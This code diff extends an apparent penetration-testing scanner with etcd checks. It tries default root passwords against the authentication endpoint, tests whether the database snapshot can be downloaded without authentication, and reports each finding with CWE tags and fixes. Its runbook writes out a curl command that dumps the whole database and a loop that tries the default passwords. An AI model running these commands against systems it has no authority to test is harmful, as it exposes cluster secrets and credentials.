@@ -28,6 +28,20 @@ _DEFAULT_PORT = 2379
 _TIMEOUT = 3.0
 _UA = "recce-probe/1.0"
 
+# Seeded credential pairs for /v3/auth/authenticate. Sourced from etcd's own
+# Documentation/op-guide/authentication.md (root/root is the historical example)
+# and community deploy templates. Not CVE-derived, no vendor-specific creds.
+# Order: most common first; the empty-secret case is last because some etcd
+# versions reject empty passwords at the validator (400 not 401) before
+# reaching the auth check, which is useful info too but not a positive.
+_DEFAULT_AUTH_PAIRS = (
+    ("root", "root"),
+    ("root", "etcd"),
+    ("root", "password"),
+    ("root", "admin"),
+    ("root", ""),
+)
+
 
 def is_etcd(port: Port) -> bool:
     svc = (port.service or "").lower()
@@ -125,7 +139,93 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
         except (ValueError, UnicodeDecodeError):
             pass
 
+    # v3 Maintenance snapshot — separately-gated permission from kv/range on many
+    # deployments; the response is a gRPC-JSON stream of {"result":{"blob":"...",
+    # "remaining_bytes":"N"}} frames concatenated. Even one decodable blob frame
+    # is proof the server is streaming the bbolt DB to an anonymous caller —
+    # we cap the read in _http so a positive here is not a full download.
+    snap = _snapshot_probe(ip, port, timeout=timeout)
+    out["snapshot_ok"] = snap["ok"]
+    out["snapshot_bytes"] = snap["bytes"]
+
+    # Default-credential authenticate — attempted only when unauth v3 read
+    # failed (a positive read means auth is off, so credentials are moot).
+    # /v3/auth/authenticate returns {"token": "..."} on success.
+    if not out["v3_readable"]:
+        cred = _default_cred_probe(ip, port, timeout=timeout)
+        if cred:
+            out["default_cred_user"] = cred[0]
+            out["default_cred_pass"] = cred[1]
+
     return out
+
+
+def _snapshot_probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
+    """POST /v3/maintenance/snapshot with an empty body. Returns
+    {'ok': bool, 'status': int, 'bytes': int}. The bytes count is the sum of
+    base64-decoded blob chunks observed in the (capped) response prefix — not a
+    complete download."""
+    r = _http(ip, port, "POST", "/v3/maintenance/snapshot", body=b"{}",
+              headers={"Content-Type": "application/json"}, timeout=timeout)
+    if r is None:
+        return {"ok": False, "status": 0, "bytes": 0}
+    status, _, body = r
+    if status != 200 or not body:
+        return {"ok": False, "status": status, "bytes": 0}
+    # gRPC-JSON streaming: successive JSON objects. The gateway does not
+    # newline-delimit reliably; try line-split first, then a naïve split on
+    # "}{". A single decodable blob chunk is enough for a positive verdict.
+    bytes_dumped = 0
+    ok = False
+    text = body.decode("utf-8", "replace")
+    if '"blob"' not in text and '"result"' not in text:
+        return {"ok": False, "status": status, "bytes": 0}
+    candidates = text.split("\n") if "\n" in text.strip() else text.replace("}{", "}\x00{").split("\x00")
+    for chunk in candidates:
+        chunk = chunk.strip()
+        if not chunk:
+            continue
+        try:
+            obj = json.loads(chunk)
+        except ValueError:
+            continue
+        blob = ((obj.get("result") or {}).get("blob")) or obj.get("blob") or ""
+        if blob:
+            try:
+                bytes_dumped += len(base64.b64decode(blob, validate=False))
+                ok = True
+            except (ValueError, TypeError):
+                pass
+    return {"ok": ok, "status": status, "bytes": bytes_dumped}
+
+
+def _default_cred_probe(ip: str, port: int,
+                        timeout: float = _TIMEOUT) -> tuple[str, str] | None:
+    """Try seeded (user, password) pairs against POST /v3/auth/authenticate.
+    Returns the first pair that yields a bearer token, or None. Bounded by
+    len(_DEFAULT_AUTH_PAIRS) requests."""
+    for user, pw in _DEFAULT_AUTH_PAIRS:
+        body = json.dumps({"name": user, "password": pw}).encode()
+        r = _http(ip, port, "POST", "/v3/auth/authenticate", body=body,
+                  headers={"Content-Type": "application/json"}, timeout=timeout)
+        if r is None:
+            # Network error on this attempt — try the next pair; it might
+            # transiently succeed against a different TLS path.
+            continue
+        status, _, resp = r
+        if status != 200:
+            continue
+        try:
+            j = json.loads(resp.decode("utf-8", "replace"))
+        except (ValueError, UnicodeDecodeError):
+            continue
+        # etcd returns {"header":{...},"token":"<jwt>"} on success; on failure
+        # the gateway returns 200 with {"error":"...","code":3} for older
+        # versions and 400/401 for newer — the token key is authoritative.
+        token = j.get("token")
+        if isinstance(token, str) and token:
+            return (user, pw)
+    return None
 
 
 def _count_v2_nodes(node: dict) -> int:
@@ -180,6 +280,27 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Bind etcd to a private interface. Never expose 2379 to a "
                     "network shared with untrusted clients.",
                     ["CWE-306", "CWE-284", "CWE-200"], kind="etcd_unauth_read"))
+            elif pr.get("default_cred_user"):
+                # Unauth reads failed but a seeded credential authenticated.
+                # This is critical: the token from /v3/auth/authenticate is
+                # usable against every other endpoint, defeating the auth wall.
+                u = pr["default_cred_user"]
+                pw_disp = pr.get("default_cred_pass") or "<empty>"
+                out.append(_finding(
+                    "critical",
+                    "etcd default-credential authentication", tgt,
+                    f"etcd (version {pr.get('version','?')}) authenticated the "
+                    f"seeded pair '{u}:{pw_disp}' via POST /v3/auth/authenticate "
+                    f"and returned a bearer token. That token authorizes every "
+                    f"downstream RPC (kv/range, maintenance/snapshot, "
+                    f"cluster/member/list), fully bypassing the auth wall the "
+                    f"anonymous v2/v3 range probes hit.",
+                    f"curl -sk -X POST http://{h.ip}:{p.portid}/v3/auth/authenticate "
+                    f"-d '{{\"name\":\"{u}\",\"password\":\"{pw_disp}\"}}'",
+                    "Rotate the etcd root password and every user password. Use "
+                    "long random secrets, not deploy-template defaults. Prefer "
+                    "--client-cert-auth over password auth for etcd.",
+                    ["CWE-798", "CWE-521"], kind="etcd_default_creds"))
             else:
                 # Reachable but no unauth read — still worth an info-level
                 # finding so the tester knows there's an etcd here to attack
@@ -193,6 +314,31 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl http://{h.ip}:{p.portid}/version",
                     "Ensure etcd continues to require client-cert or RBAC auth.",
                     [], kind="etcd_authed"))
+            # Snapshot download is separately-gated from kv/range on many
+            # deployments — emit even when kv/range failed. Independent finding
+            # because the primitive (full bbolt dump, including uncompacted
+            # historical revisions of deleted Secrets) is distinct from a
+            # live-key read: it also recovers keys that were compacted away.
+            if pr.get("snapshot_ok"):
+                bshown = pr.get("snapshot_bytes") or 0
+                out.append(_finding(
+                    "critical",
+                    "etcd unauthenticated snapshot download", tgt,
+                    f"POST /v3/maintenance/snapshot on etcd (version "
+                    f"{pr.get('version','?')}) streamed the bbolt database "
+                    f"file to an anonymous caller "
+                    f"({bshown} bytes decoded from the capped response prefix). "
+                    f"A snapshot contains every live key AND uncompacted "
+                    f"historical revisions — deleted Kubernetes Secrets can be "
+                    f"recovered offline with bbolt walking, regardless of "
+                    f"whether current kv/range is denied.",
+                    f"curl -sk -X POST http://{h.ip}:{p.portid}/v3/maintenance/snapshot "
+                    f"-o etcd-snap.db && etcdctl snapshot status etcd-snap.db",
+                    "Restrict /v3/maintenance/* to authenticated maintenance-role "
+                    "principals; enable --client-cert-auth. Note that snapshot "
+                    "permission is gated separately from kv/range — auditing "
+                    "kv/range alone is insufficient.",
+                    ["CWE-306", "CWE-200"], kind="etcd_snapshot_download"))
     return out
 
 
@@ -204,6 +350,13 @@ def runbook(ip: str, port: int) -> list[dict]:
          "cmd": f"etcdctl --endpoints http://{ip}:{port} get / --prefix --keys-only"},
         {"step": "Enumerate all keys (v2)",
          "cmd": f"curl -sk 'http://{ip}:{port}/v2/keys/?recursive=true'"},
+        {"step": "Download bbolt snapshot (crown-jewel dump)",
+         "cmd": f"curl -sk -X POST http://{ip}:{port}/v3/maintenance/snapshot "
+                f"-o etcd-snap.db && etcdctl snapshot status etcd-snap.db"},
+        {"step": "Try seeded credentials against auth (root/root, root/etcd, ...)",
+         "cmd": f"for p in root etcd password admin ''; do curl -sk -X POST "
+                f"http://{ip}:{port}/v3/auth/authenticate "
+                f"-d \"{{\\\"name\\\":\\\"root\\\",\\\"password\\\":\\\"$p\\\"}}\"; done"},
     ]
 
 
